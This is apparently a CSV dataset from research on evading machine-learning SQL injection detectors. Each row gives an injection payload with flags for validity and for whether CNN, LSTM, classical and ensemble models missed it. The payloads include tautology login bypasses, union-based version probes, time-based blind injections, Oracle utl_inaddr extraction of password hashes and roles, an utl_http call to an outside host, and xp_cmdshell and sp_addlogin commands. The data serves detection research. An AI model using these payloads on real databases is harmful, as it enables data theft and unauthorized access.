,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
177,1  )   or pg_sleep  (  __TIME__  )  --,1  )   or pg_sleep  (  __TIME__  )  --,0,1,0,0,0,0,0
178," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1"," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",0,1,0,0,0,0,0
179,"""  )   or sleep  (  __TIME__  )    =  ""","""  )   or sleep  (  __TIME__  )    =  """,1,1,0,0,0,0,0
180,select * from users where id  =  1.<@. or 1  =  1 -- 1,select * from users where id  =  1.<@. or 1  =  1 -- 1,1,1,1,0,0,0,0
181,"admin""  )   or   (  ""1""  =  ""1""--","admin""  )   or   (  ""1""  =  ""1""--",1,1,0,0,0,0,0
182," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1"," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,1,1,0,0,0,0
183,; exec xp_regread,; exec xp_regread,0,1,1,1,1,1,1
184," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'"," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,1,1,0,0,0,0
185,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,0,1,0,0,0,0,0
186," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1"," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",0,1,0,0,0,0,0
187," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",0,1,0,0,0,0,0
188,1 and 1  =  1,1 and 1  =  1,0,1,0,0,0,0,0
189,or 0  =  0 #,or 0  =  0 #,0,1,0,0,0,0,0
190,union select * from users where login   =   char ...,union select * from users where login   =   char ...,1,1,0,0,0,0,0
191," select * from users where id  =  1 union select 1||@,version  (    )   -- 1"," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,1,1,0,0,0,0
192,admin'  )   or '1'  =  '1'--,admin'  )   or '1'  =  '1'--,1,1,0,0,0,0,0
193,1;SELECT *,1;SELECT *,1,1,1,1,1,1,1
194," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",0,1,0,0,0,0,0
195,x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,1,0,0,0,0,0
196," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'"," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,1,1,0,0,0,0
197," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",0,1,0,0,0,0,0
198," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'"," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,0,0,0,0,0
199,"1 or benchmark  (  10000000,MD5  (  1   )    )   #","1 or benchmark  (  10000000,MD5  (  1   )    )   #",0,1,0,0,0,0,0
200,procedure,procedure,0,1,1,1,0,1,0
201,or ''  =  ',or ''  =  ',1,1,0,0,0,0,0
202, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,1,0,0,0,0,0
203," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
204,\'; desc users; --,\'; desc users; --,0,1,1,1,0,1,0
205," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1"," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",0,1,1,0,0,0,0
206,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,1,0,0,0,0,0
207,""" or """"^""",""" or """"^""",1,1,0,0,0,0,0
208,"""-""","""-""",1,1,1,1,0,1,0
209," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1"," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",0,1,1,0,0,0,0
210," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1"," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,1,1,0,0,0,0
211," select * from users where id  =  1 *\ union select null,@@VERSION -- 1"," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",0,1,1,0,0,0,0
212," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'"," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,1,0,0,0,0,0
213," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1"," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",0,1,0,0,0,0,0
214,admin'/*,admin'/*,1,1,1,1,0,1,0
215," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",0,1,0,0,0,0,0
216,||UTL_HTTP.REQUEST,||UTL_HTTP.REQUEST,0,1,1,1,0,1,0
217," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
218," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'"," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,1,1,0,0,0,0
219,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #","""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",0,1,0,0,0,0,0
220," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1"," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,1,1,0,0,0,0
221," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1"," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,1,0,0,0,0,0
222,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,1,1,0,0,0,0
223,1 uni/**/on select all from where,1 uni/**/on select all from where,1,1,1,0,0,0,0
224," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1"," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,1,1,0,0,0,0
225," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1"," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",0,1,0,0,0,0,0
226,admin'  )   or '1'  =  '1'#,admin'  )   or '1'  =  '1'#,1,1,0,0,0,0,0
227,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,1,0,0,0,0,0
228,or '7659'  =  '7659,or '7659'  =  '7659,1,1,1,0,0,0,0
229," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",0,1,1,0,0,0,0
230," select * from users where id  =  1 union select +!<1,version  (    )   -- 1"," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,1,0,0,0,0,0
231," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
232," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",0,1,0,0,0,0,0
233,or true--,or true--,0,1,1,1,0,1,0
234," select * from users where id  =  1 union select !<1,version  (    )   -- 1"," select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,1,0,0,0,0,0
235," select * from users where id  =  '1' union select \#,@@VERSION -- 1'"," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,1,1,0,0,0,0
236," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1"," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",0,1,0,0,0,0,0
237,""" or true--",""" or true--",0,1,1,0,0,0,0
238,select * from users where id  =  1. or 1  =  1 -- 1,select * from users where id  =  1. or 1  =  1 -- 1,1,1,0,0,0,0,0
239," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1"," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",0,1,0,0,0,0,0
240," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1"," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",0,1,0,0,0,0,0
241,â or 3  =  3 --,â or 3  =  3 --,0,1,0,0,0,0,0
242, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,1,0,0,0,0,0
243," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
244," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1"," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,1,0,0,0,0,0
245," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1"," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,1,0,0,0,0,0
246," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1"," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",0,1,0,0,0,0,0
247," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",0,1,0,0,0,0,0
248, or uid like '%, or uid like '%,1,1,0,0,0,0,0
249,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,1,1,0,0,0,0
250," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'"," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,1,0,0,0,0,0
251,23 or 1  =  1; --,23 or 1  =  1; --,0,1,0,0,0,0,0
252," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1"," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",0,1,1,0,0,0,0
253," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1"," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,1,0,0,0,0,0
254," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",0,1,0,0,0,0,0
255,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,0,1,0,0,0,0,0
256," select * from users where id  =  '1' union select \,@@VERSION -- 1'"," select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,1,1,0,0,0,0
257,0 or 1  =  1,0 or 1  =  1,0,1,0,0,0,0,0
258,select * from users where id  =  1 &@ or 1  =  1 -- 1,select * from users where id  =  1 &@ or 1  =  1 -- 1,1,1,1,0,0,0,0
259,"admin""  )   or ""1""  =  ""1","admin""  )   or ""1""  =  ""1",1,1,0,0,0,0,0
260,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,0,1,0,0,0,0,0
261," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",0,1,1,0,0,0,0
262," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
263," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i"," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1,0,0,0,0,0
264,&apos; OR,&apos; OR,0,1,1,1,1,1,1
265,sqlvuln;,sqlvuln;,0,1,1,1,0,1,0
266,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,1,0,0,0,0,0
267,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',0,1,0,0,0,0,0
268,""" or """"*""",""" or """"*""",1,1,0,0,0,0,0
269,"hi or 1  =  1 --""","hi or 1  =  1 --""",0,1,0,0,0,0,0
270," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
271,; exec master..xp_cmdshell 'ping 172.10.1.255'--,; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,1,1,1,0,1,0
272," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'"," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,0,0,0,0,0
273," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'"," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,1,1,0,0,0,0
274,select * from information_schema.tables--,select * from information_schema.tables--,1,1,1,1,0,1,0
275,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,0,1,0,0,0,0,0
276,   (  select top 1,   (  select top 1,1,1,1,0,0,0,0
277,Ã½ or 1  =  1 --,Ã½ or 1  =  1 --,0,1,0,0,0,0,0
278,a' --,a' --,1,1,1,1,0,1,0
279, or 1  =  1 /*, or 1  =  1 /*,0,1,0,0,0,0,0
280," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1"," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",0,1,0,0,0,0,0
281," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'"," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,1,1,0,0,0,0
282,--,--,0,1,1,1,0,1,0
283,"exec sp_addlogin 'name' , 'password'","exec sp_addlogin 'name' , 'password'",1,1,1,1,0,1,0
284," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1"," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,1,0,0,0,0,0
285,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,0,1,1,1,0,1,0
286," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1"," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",0,1,0,0,0,0,0
287," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1"," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,1,1,0,0,0,0
288,group by userid having 1  =  1--,group by userid having 1  =  1--,0,1,0,0,0,0,0
289," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1"," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",0,1,0,0,0,0,0
290,select * from users where id  =  1 *1 or 1  =  1 -- 1,select * from users where id  =  1 *1 or 1  =  1 -- 1,1,1,0,0,0,0,0
291," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1"," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",0,1,0,0,0,0,0
292,‘ or 1  =  1 --,‘ or 1  =  1 --,0,1,0,0,0,0,0
293," select * from users where id  =  1 *\. union select null,@@VERSION -- 1"," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",0,1,1,0,0,0,0
294,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,1,0,0,0,0,0
295,or 'a'  =  'a,or 'a'  =  'a,1,1,0,0,0,0,0
296,declare @s varchar  (  22  )   select @s   = ,declare @s varchar  (  22  )   select @s   = ,1,1,0,1,0,0,0
297," select * from users where id  =  1 union select 1<@,version  (    )   -- 1"," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,1,1,0,0,0,0
298," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1"," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",0,1,1,0,0,0,0
299," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1"," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",0,1,0,0,0,0,0
300,@variable,@variable,0,1,1,1,0,1,0
301,; exec master..xp_cmdshell,; exec master..xp_cmdshell,0,1,1,1,0,1,0
302,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,1,0,0,0,0,0
303," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1"," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,1,0,0,0,0,0
304," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1"," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,1,1,0,0,0,0
305," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1"," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,1,0,0,0,0,0
306," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'"," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",0,1,1,0,0,0,0
307, and 1 in   (  select var from temp  )  --, and 1 in   (  select var from temp  )  --,1,1,0,0,0,0,0
308," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'"," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,1,0,0,0,0,0
309," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",0,1,0,0,0,0,0
310," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1"," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",0,1,0,0,0,0,0
